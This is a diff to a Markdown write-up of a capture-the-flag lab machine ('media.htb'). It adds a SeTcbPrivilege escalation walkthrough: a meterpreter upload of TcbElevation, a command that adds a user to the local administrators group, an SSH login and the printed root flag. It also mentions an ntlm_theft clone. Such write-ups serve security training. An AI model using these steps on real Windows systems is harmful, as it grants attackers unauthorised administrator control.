@@ -63,6 +63,8 @@ Content-Type: text/html; charset=UTF-8
 
 ```
 
+
+
 ---
 ## Foothold
 
@@ -74,7 +76,6 @@ Description of the vulnerability exploited.
 
 ### Exploitation
 
-Step-by-step exploitation with commands.
 
 ```shell
 git clone https://github.com/Greenwolf/ntlm_theft.git           
@@ -667,6 +668,174 @@ SeTimeZonePrivilege           Change the time zone                Disabled
 
 
 c:\>
+
+```
+
+## setcbprivilege exploitation
+
+poc: https://github.com/b4lisong/SeTcbPrivilege-Abuse
+
+```
+meterpreter > upload TcbElevation-x64.exe
+[*] Uploading  : /home/kali/machines/media/SeTcbPrivilege-Abuse/TcbElevation-x64.exe -> TcbElevation-x64.exe
+[*] Uploaded 12.50 KiB of 12.50 KiB (100.0%): /home/kali/machines/media/SeTcbPrivilege-Abuse/TcbElevation-x64.exe -> TcbElevation-x64.exe
+[*] Completed  : /home/kali/machines/media/SeTcbPrivilege-Abuse/TcbElevation-x64.exe -> TcbElevation-x64.exe
+meterpreter > shell
+Process 756 created.
+Channel 7 created.
+Microsoft Windows [Version 10.0.20348.4052]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\tmp>.\tcb.exe "C:\Windows\system32\cmd.exe /c net localgroup administrators enox /add"
+.\tcb.exe "C:\Windows\system32\cmd.exe /c net localgroup administrators enox /add"
+[+] SeTcbPrivilege enabled
+[+] AcquireCredentialsHandleW hooked
+[+] Connected to service control manager
+[+] Created service 'AAATcb' with command 'C:\Windows\system32\cmd.exe /c net localgroup administrators enox /add'.
+[!] StartService returned an error, but the command should have been executed. Check it yourself! Error: The service did not respond to the start or control request in a timely fashion..
+[+] Service deleted successfully.
+
+C:\tmp>.\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add"
+.\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add"
+Error starting service 2
+
+C:\tmp>net localgroup administrat
+rnet localgroup administrat
+System error 1376 has occurred.
+
+The specified local group does not exist.
+
+
+C:\tmp net localgroup administrators
+ net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+enox
+NT AUTHORITY\LOCAL SERVICE
+The command completed successfully.
+
+
+C:\tmp>cd c:\users\Administrator
+cd c:\users\Administrator
+Access is denied.
+
+C:\tmp>
+
+```
+
+### Root flag
+
+```
+ssh enox@media.htb      
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+enox@media.htb's password: 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Microsoft Windows [Version 10.0.20348.4052]
+(c) Microsoft Corporation. All rights reserved.
+
+enox@MEDIA C:\Users\enox>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes                                                     
+============================================================= ================ ============ ===============================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                
+
+enox@MEDIA C:\Users\enox>cd c:\users    
+
+enox@MEDIA c:\Users>cd administrator 
+
+enox@MEDIA c:\Users\Administrator>r  
+'r' is not recognized as an internal or external command,
+operable program or batch file.
+
+enox@MEDIA c:\Users\Administrator>cd Desktop
+
+enox@MEDIA c:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of c:\Users\Administrator\Desktop
+
+10/02/2023  11:04 AM    <DIR>          .
+10/01/2023  11:48 PM    <DIR>          ..
+09/27/2026  03:22 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   9,976,872,960 bytes free
+
+enox@MEDIA c:\Users\Administrator\Desktop>type root.txt
+7f174b2d3f5cdb5f1eb6e7cbe9e06ad7
+
+enox@MEDIA c:\Users\Administrator\Desktop>
+
 
 ```
 
